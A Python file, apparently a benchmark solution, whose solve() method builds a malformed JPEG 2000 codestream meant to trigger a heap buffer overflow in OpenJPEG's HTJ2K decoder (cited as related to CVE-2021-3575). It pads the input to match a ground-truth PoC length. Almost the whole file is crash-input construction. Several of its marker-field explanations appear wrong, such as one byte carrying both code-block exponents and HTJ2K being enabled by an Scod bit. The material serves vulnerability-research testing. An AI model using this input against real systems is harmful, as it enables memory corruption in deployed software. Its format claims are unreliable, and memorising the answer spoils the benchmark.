import struct

class Solution:
    """
    Generates a Proof-of-Concept input for a heap buffer overflow in OpenJPEG.
    The vulnerability (related to CVE-2021-3575) is in the opj_t1_allocate_buffers
    function within the HT_DEC (High-Throughput Decoder) component.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is triggered by specifying code-block dimensions in the
        COD (Coding style default) marker that are significantly larger than the
        actual image dimensions specified in the SIZ (Image and tile size) marker.
        When using the HTJ2K decoding path, the library fails to validate these
        dimensions against the image size, leading to an erroneously large
        memory allocation. This large allocation can subsequently lead to a
        heap buffer overflow during data processing.

        The PoC is a JPEG 2000 (J2K) file with:
        1. A small image size (1x1 pixels) defined in the SIZ marker.
        2. HTJ2K decoding enabled in the COD marker.
        3. The maximum possible code-block dimensions (32768x32768) in the COD marker.
        4. Padding with a PLT marker to approach the ground-truth PoC length, which
           can be important for bypassing certain parser checks.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        # Start of Codestream (SOC) marker
        poc = b'\xff\x4f'

        # Image and tile size (SIZ) marker segment
        # Defines a minimal 1x1 pixel image with one component.
        siz_payload = (
            b'\x00\x00' +                # Rsiz: Profile 0 (Main)
            b'\x00\x00\x00\x01' +        # Xsiz: Image width = 1
            b'\x00\x00\x00\x01' +        # Ysiz: Image height = 1
            b'\x00\x00\x00\x00' +        # XOsiz: Image X offset = 0
            b'\x00\x00\x00\x00' +        # YOsiz: Image Y offset = 0
            b'\x00\x00\x00\x01' +        # XTsiz: Tile width = 1
            b'\x00\x00\x00\x01' +        # YTsiz: Tile height = 1
            b'\x00\x00\x00\x00' +        # XTOsiz: Tile X offset = 0
            b'\x00\x00\x00\x00' +        # YTOsiz: Tile Y offset = 0
            b'\x00\x01' +                # Csiz: Number of components = 1
            b'\x08\x01\x01'              # Ssiz_0, XRsiz_0, YRsiz_0: 8-bit, 1x1 subsampling
        )
        poc += b'\xff\x51' + struct.pack('>H', len(siz_payload) + 2) + siz_payload

        # Coding style default (COD) marker segment
        # This is the core of the exploit. We enable HTJ2K and set huge code-block dimensions.
        cod_payload = (
            b'\x20' +                # Scod: Bit 5 (0x20) enables HTJ2K
            b'\x00\x00\x00\x00' +    # SGcod: Default progression, 1 layer, no MCT
            b'\x05' +                # SPcod[0]: Number of decomposition levels = 5 + 1 = 6
            b'\xff' +                # SPcod[1]: Code-block dimensions exponents.
                                     # Width exponent: 0xf -> 1<<15 = 32768
                                     # Height exponent: 0xf -> 1<<15 = 32768
            b'\x00' +                # SPcod[2]: Code-block style (default)
            b'\x10\x10\x10\x10'      # SPcod[3-6]: DWT transformation (reversible 5-3)
        )
        poc += b'\xff\x52' + struct.pack('>H', len(cod_payload) + 2) + cod_payload

        # Quantization default (QCD) marker segment
        qcd_payload = (
            b'\x01' +                # Sqcd: Scalar explicit quantization
            b'\x00\x00'              # SPqcd: Quantization values
        )
        poc += b'\xff\x5c' + struct.pack('>H', len(qcd_payload) + 2) + qcd_payload

        # Start of Tile-part (SOT) marker segment
        sot_payload = (
            b'\x00\x00' +            # Isot: Tile index = 0
            b'\x00\x00\x00\x00' +    # Psot: Tile-part length (0 means until EOC)
            b'\x00' +                # TPsot: Tile-part index = 0
            b'\x01'                  # TNsot: Number of tile-parts = 1
        )
        poc += b'\xff\x90' + struct.pack('>H', len(sot_payload) + 2) + sot_payload

        # Packet Length, tile-part (PLT) marker segment
        # Used to pad the PoC to the ground-truth length.
        target_len = 1479
        current_len = len(poc)
        trailer_len = 2 + 2 # SOD + EOC
        plt_header_len = 2 + 2 # marker + length
        plt_payload_len = target_len - current_len - trailer_len - plt_header_len
        
        if plt_payload_len > 0:
            plt_payload = b'\x00' * plt_payload_len
            poc += b'\xff\x58' + struct.pack('>H', len(plt_payload) + 2) + plt_payload

        # Start of Data (SOD) marker
        poc += b'\xff\x93'

        # End of Codestream (EOC) marker
        poc += b'\xff\xd9'
        
        # In case of miscalculation, truncate/pad to ensure exact length
        if len(poc) > target_len:
            poc = poc[:target_len-2] + b'\xff\xd9'
        elif len(poc) < target_len:
            padding_needed = target_len - len(poc)
            # Insert padding before the final EOC marker
            poc = poc[:-2] + (b'\x00' * padding_needed) + poc[-2:]

        return poc